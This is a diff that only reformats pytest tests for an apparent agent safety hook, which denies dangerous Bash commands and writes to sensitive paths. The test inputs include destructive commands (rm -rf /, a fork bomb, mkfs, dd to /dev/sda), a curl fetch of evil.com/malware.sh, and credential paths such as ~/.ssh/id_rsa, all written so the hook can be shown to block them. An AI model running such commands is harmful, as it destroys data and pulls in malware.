@@ -36,12 +36,14 @@ class TestExpandVariables:
     def test_expand_home(self) -> None:
         """Test $HOME expansion."""
         import os
+
         result = expand_variables("rm -rf $HOME")
         assert os.environ.get("HOME", "/home") in result or "rm -rf" in result
 
     def test_expand_braces(self) -> None:
         """Test ${VAR} expansion."""
         import os
+
         os.environ["TEST_VAR"] = "/test/path"
         result = expand_variables("cat ${TEST_VAR}/file")
         assert "/test/path" in result
@@ -95,20 +97,14 @@ class TestValidateBashCommand:
     @pytest.mark.asyncio
     async def test_allows_safe_command(self) -> None:
         """Test that safe commands are allowed."""
-        input_data = {
-            "tool_name": "Bash",
-            "tool_input": {"command": "ls -la"}
-        }
+        input_data = {"tool_name": "Bash", "tool_input": {"command": "ls -la"}}
         result = await validate_bash_command(input_data, None, None)
         assert result == {}
 
     @pytest.mark.asyncio
     async def test_blocks_rm_rf_root(self) -> None:
         """Test blocking rm -rf /."""
-        input_data = {
-            "tool_name": "Bash",
-            "tool_input": {"command": "rm -rf /"}
-        }
+        input_data = {"tool_name": "Bash", "tool_input": {"command": "rm -rf /"}}
         result = await validate_bash_command(input_data, None, None)
         assert "hookSpecificOutput" in result
         assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
@@ -116,20 +112,14 @@ class TestValidateBashCommand:
     @pytest.mark.asyncio
     async def test_blocks_rm_rf_home(self) -> None:
         """Test blocking rm -rf ~."""
-        input_data = {
-            "tool_name": "Bash",
-            "tool_input": {"command": "rm -rf ~"}
-        }
+        input_data = {"tool_name": "Bash", "tool_input": {"command": "rm -rf ~"}}
         result = await validate_bash_command(input_data, None, None)
         assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
 
     @pytest.mark.asyncio
     async def test_blocks_fork_bomb(self) -> None:
         """Test blocking fork bomb."""
-        input_data = {
-            "tool_name": "Bash",
-            "tool_input": {"command": ":(){ :|:& };:"}
-        }
+        input_data = {"tool_name": "Bash", "tool_input": {"command": ":(){ :|:& };:"}}
         result = await validate_bash_command(input_data, None, None)
         assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
 
@@ -138,7 +128,7 @@ class TestValidateBashCommand:
         """Test blocking mkfs commands."""
         input_data = {
             "tool_name": "Bash",
-            "tool_input": {"command": "mkfs.ext4 /dev/sda1"}
+            "tool_input": {"command": "mkfs.ext4 /dev/sda1"},
         }
         result = await validate_bash_command(input_data, None, None)
         assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
@@ -148,7 +138,7 @@ class TestValidateBashCommand:
         """Test blocking dd with dangerous output."""
         input_data = {
             "tool_name": "Bash",
-            "tool_input": {"command": "dd if=/dev/zero of=/dev/sda"}
+            "tool_input": {"command": "dd if=/dev/zero of=/dev/sda"},
         }
         result = await validate_bash_command(input_data, None, None)
         assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
@@ -157,19 +147,18 @@ class TestValidateBashCommand:
     async def test_blocks_shutdown(self) -> None:
         """Test blocking shutdown commands."""
         for cmd in ["shutdown now", "reboot", "halt", "poweroff"]:
-            input_data = {
-                "tool_name": "Bash",
-                "tool_input": {"command": cmd}
-            }
+            input_data = {"tool_name": "Bash", "tool_input": {"command": cmd}}
             result = await validate_bash_command(input_data, None, None)
-            assert result["hookSpecificOutput"]["permissionDecision"] == "deny", f"Failed to block: {cmd}"
+            assert result["hookSpecificOutput"]["permissionDecision"] == "deny", (
+                f"Failed to block: {cmd}"
+            )
 
     @pytest.mark.asyncio
     async def test_blocks_compound_with_dangerous(self) -> None:
         """Test blocking compound commands containing dangerous patterns."""
         input_data = {
             "tool_name": "Bash",
-            "tool_input": {"command": "echo hello && rm -rf /"}
+            "tool_input": {"command": "echo hello && rm -rf /"},
         }
         result = await validate_bash_command(input_data, None, None)
         assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
@@ -180,7 +169,7 @@ class TestValidateBashCommand:
         config = SafetyConfig(bash_blocklist=[r"curl.*evil\.com"])
         input_data = {
             "tool_name": "Bash",
-            "tool_input": {"command": "curl https://evil.com/malware.sh"}
+            "tool_input": {"command": "curl https://evil.com/malware.sh"},
         }
         result = await validate_bash_command(input_data, None, None, config=config)
         assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
@@ -191,7 +180,7 @@ class TestValidateBashCommand:
         config = SafetyConfig(bash_allow_override=[r"rm -rf node_modules"])
         input_data = {
             "tool_name": "Bash",
-            "tool_input": {"command": "rm -rf node_modules"}
+            "tool_input": {"command": "rm -rf node_modules"},
         }
         result = await validate_bash_command(input_data, None, None, config=config)
         # This should be allowed despite containing rm -rf
@@ -203,7 +192,7 @@ class TestValidateBashCommand:
         # Passing None command should trigger exception but fail closed
         input_data = {
             "tool_name": "Bash",
-            "tool_input": {}  # Missing command
+            "tool_input": {},  # Missing command
         }
         result = await validate_bash_command(input_data, None, None)
         # Should block (fail closed)
@@ -218,12 +207,14 @@ class TestNormalizePath:
         import os
 
         from maverick.hooks.safety import normalize_path
+
         result = normalize_path("~/.ssh/id_rsa")
         assert os.path.expanduser("~") in result
 
     def test_resolve_relative(self) -> None:
         """Test relative path resolution."""
         from maverick.hooks.safety import normalize_path
+
         result = normalize_path("./file.txt")
         assert result.startswith("/")
 
@@ -235,9 +226,10 @@ class TestValidateFileWrite:
     async def test_allows_normal_file(self) -> None:
         """Test that normal file writes are allowed."""
         from maverick.hooks.safety import validate_file_write
+
         input_data = {
             "tool_name": "Write",
-            "tool_input": {"file_path": "/tmp/test.txt"}
+            "tool_input": {"file_path": "/tmp/test.txt"},
         }
         result = await validate_file_write(input_data, None, None)
         assert result == {}
@@ -246,9 +238,10 @@ class TestValidateFileWrite:
     async def test_blocks_env_file(self) -> None:
         """Test blocking .env file writes."""
         from maverick.hooks.safety import validate_file_write
+
         input_data = {
             "tool_name": "Write",
-            "tool_input": {"file_path": "/project/.env"}
+            "tool_input": {"file_path": "/project/.env"},
         }
         result = await validate_file_write(input_data, None, None)
         assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
@@ -257,9 +250,10 @@ class TestValidateFileWrite:
     async def test_blocks_env_local(self) -> None:
         """Test blocking .env.local file writes."""
         from maverick.hooks.safety import validate_file_write
+
         input_data = {
             "tool_name": "Write",
-            "tool_input": {"file_path": "/project/.env.local"}
+            "tool_input": {"file_path": "/project/.env.local"},
         }
         result = await validate_file_write(input_data, None, None)
         assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
@@ -270,11 +264,9 @@ class TestValidateFileWrite:
         import os
 
         from maverick.hooks.safety import validate_file_write
+
         ssh_path = os.path.expanduser("~/.ssh/id_rsa")
-        input_data = {
-            "tool_name": "Write",
-            "tool_input": {"file_path": ssh_path}
-        }
+        input_data = {"tool_name": "Write", "tool_input": {"file_path": ssh_path}}
         result = await validate_file_write(input_data, None, None)
         assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
 
@@ -282,10 +274,8 @@ class TestValidateFileWrite:
     async def test_blocks_etc_directory(self) -> None:
         """Test blocking /etc/ writes."""
         from maverick.hooks.safety import validate_file_write
-        input_data = {
-            "tool_name": "Write",
-            "tool_input": {"file_path": "/etc/passwd"}
-        }
+
+        input_data = {"tool_name": "Write", "tool_input": {"file_path": "/etc/passwd"}}
         result = await validate_file_write(input_data, None, None)
         assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
 
@@ -293,9 +283,10 @@ class TestValidateFileWrite:
     async def test_blocks_secrets_directory(self) -> None:
         """Test blocking secrets/ writes."""
         from maverick.hooks.safety import validate_file_write
+
         input_data = {
             "tool_name": "Write",
-            "tool_input": {"file_path": "/project/secrets/api_key.txt"}
+            "tool_input": {"file_path": "/project/secrets/api_key.txt"},
         }
         result = await validate_file_write(input_data, None, None)
         assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
@@ -305,10 +296,11 @@ class TestValidateFileWrite:
         """Test custom path allowlist."""
         from maverick.hooks.config import SafetyConfig
         from maverick.hooks.safety import validate_file_write
+
         config = SafetyConfig(path_allowlist=[".env.example"])
         input_data = {
             "tool_name": "Write",
-            "tool_input": {"file_path": "/project/.env.example"}
+            "tool_input": {"file_path": "/project/.env.example"},
         }
         result = await validate_file_write(input_data, None, None, config=config)
         assert result == {}
@@ -318,10 +310,11 @@ class TestValidateFileWrite:
         """Test custom path blocklist."""
         from maverick.hooks.config import SafetyConfig
         from maverick.hooks.safety import validate_file_write
+
         config = SafetyConfig(path_blocklist=["config/production/"])
         input_data = {
             "tool_name": "Write",
-            "tool_input": {"file_path": "/project/config/production/settings.json"}
+            "tool_input": {"file_path": "/project/config/production/settings.json"},
         }
         result = await validate_file_write(input_data, None, None, config=config)
         assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
@@ -330,9 +323,10 @@ class TestValidateFileWrite:
     async def test_fail_closed_on_exception(self) -> None:
         """Test fail-closed behavior on exception."""
         from maverick.hooks.safety import validate_file_write
+
         input_data = {
             "tool_name": "Write",
-            "tool_input": {}  # Missing file_path
+            "tool_input": {},  # Missing file_path
         }
         result = await validate_file_write(input_data, None, None)
         assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
@@ -341,9 +335,7 @@ class TestValidateFileWrite:
     async def test_edit_tool_also_blocked(self) -> None:
         """Test that Edit tool is also validated."""
         from maverick.hooks.safety import validate_file_write
-        input_data = {
-            "tool_name": "Edit",
-            "tool_input": {"file_path": "/etc/hosts"}
-        }
+
+        input_data = {"tool_name": "Edit", "tool_input": {"file_path": "/etc/hosts"}}
         result = await validate_file_write(input_data, None, None)
         assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
